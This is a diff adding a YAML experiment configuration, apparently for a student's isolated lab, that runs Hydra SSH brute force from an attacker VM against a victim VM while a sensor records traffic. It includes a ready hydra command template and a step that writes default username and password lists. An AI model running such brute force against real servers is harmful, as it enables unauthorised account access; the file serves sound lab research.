@@ -1,0 +1,141 @@
+##exp_hydra_sweep.yaml
+#experiment:
+#  id: exp_hydra_single
+#  description: "Execução única: hydra contra serviço SSH do victim. Runner resolve IPs por papel."
+#  created_by: "diego"
+#  created_at: "2025-09-30T22:00:00-03:00"
+#
+#network:
+#  mode: host_only          # Runner fará preflight e recusará outro modo por segurança
+#  ntp_sync: true
+#
+#global:
+#  repetitions: 1
+#  seed: 20250930
+#  max_duration_s: 900
+#
+#targets:
+#  # O usuário informa apenas os papéis; o runner resolve os IPs automaticamente.
+#  attacker: { role: attacker }
+#  victim:   { role: victim }
+#  sensor:   { role: sensor }
+#
+#templates:
+#  hydra_brute:
+#    run_on: attacker
+#    # cmd_template deve conter placeholders: {victim}, {victim_port}, {wordlist}, {concurrency}
+#    cmd_template: "hydra -L users.txt -P {wordlist} -t {concurrency} ssh://{victim}:{victim_port} -w {timeout_s}"
+#    label: brute_ssh
+#    metadata:
+#      tool: hydra
+#      category: brute_force
+#
+#profiles:
+#  - id: default_hydra
+#    template: hydra_brute
+#    params:
+#      victim_port: 22
+#      wordlist: small_wordlist.txt
+#      concurrency: 4
+#      timeout_s: 120
+#      duration_s: 120     # duração esperada da ação (runner deve impor timeout)
+#
+#workflow:
+#  - name: preflight_checks
+#    actions:
+#      - ensure_network_mode: {}
+#      - resolve_ips: {}
+#      - start_sensor: { target: sensor }
+#
+#  - name: execute_hydra
+#    actions:
+#      - run_profile: { profile_id: default_hydra }
+#
+#  - name: post_actions
+#    actions:
+#      - stop_sensor: { target: sensor }
+#      - collect_artifacts: { save_to: "experiments/{experiment.id}" }
+
+experiment:
+  id: exp_hydra_ssh
+  description: "Hydra contra SSH (victim). IPs por papel são resolvidos pelo Runner."
+  created_by: "diego"
+  created_at: "2025-09-30T22:00:00-03:00"
+
+network:
+  mode: host_only
+  ntp_sync: true
+
+global:
+  max_duration_s: 900
+  wordlists_dir: "/vagrant/wordlists"     # se existir, faremos staging a partir daqui
+  local_lists: "$HOME/tcc/lists"          # staging local no attacker
+  hydra_wait: 120
+
+targets:
+  attacker: { role: attacker }
+  victim:   { role: victim }
+  sensor:   { role: sensor }
+
+templates:
+  # Template do Hydra propositalmente simples (1 linha) para evitar CRLF.
+  hydra_ssh:
+    run_on: attacker
+    cmd_template: "hydra -L {local_lists}/users.txt -P {local_lists}/small_wordlist.txt -t {threads} ssh://{victim}:22 -w {hydra_wait} -o {local_lists}/hydra_{victim}.out"
+    label: brute_ssh
+    metadata: { tool: hydra, category: brute_force }
+
+profiles:
+  - id: brute_small
+    template: hydra_ssh
+    params:
+      threads: 4
+      duration_s: 120       # Runner adiciona 'timeout 120' no começo do cmd
+
+workflow:
+  - name: safety
+    actions:
+      - ensure_network_mode: {}
+      - resolve_ips: {}
+      - start_sensor: { target: sensor }
+
+  - name: stage_lists
+    actions:
+      - run_cmd:
+          host: attacker
+          cmd: >
+            set -e;
+            mkdir -p {local_lists};
+            if [ -f "{wordlists_dir}/users.txt" ]; then cp -f "{wordlists_dir}/users.txt" "{local_lists}/"; fi;
+            if [ -f "{wordlists_dir}/small_wordlist.txt" ]; then cp -f "{wordlists_dir}/small_wordlist.txt" "{local_lists}/"; fi;
+            [ -s "{local_lists}/users.txt" ] || printf "vagrant\nroot\nubuntu\n" > "{local_lists}/users.txt";
+            [ -s "{local_lists}/small_wordlist.txt" ] || printf "vagrant\n123456\nadmin\npassword\n" > "{local_lists}/small_wordlist.txt";
+            ls -lh {local_lists}; head -n 5 {local_lists}/users.txt; head -n 5 {local_lists}/small_wordlist.txt
+
+  - name: attack
+    actions:
+      - run_profile: { profile_id: brute_small }
+
+  - name: collect
+    actions:
+      - stop_sensor: { target: sensor }
+      - collect_artifacts: { save_to: "experiments/{experiment.id}" }
+
+
+  # (Opcional) Passo de debug para inspecionar listas no atacante
+  # - name: debug_lists
+  #   actions:
+  #     - run_cmd:
+  #         host: attacker
+  #         cmd: >
+  #           ls -lh {local_lists} || true;
+  #           echo "--- users.txt ---";
+  #           head -n 5 {local_lists}/users.txt || true;
+  #           echo "--- small_wordlist.txt ---";
+  #           head -n 5 {local_lists}/small_wordlist.txt || true
+
+
+notes:
+  - "O runner deve substituir {victim}, {attacker}, {sensor} por IPs resolvidos."
+  - "NUNCA permitir execução se network.mode != host_only; falhar com erro claro."
+  - "As palavras de lista (wordlist) devem estar no diretório do attacker ou transferidas antes."
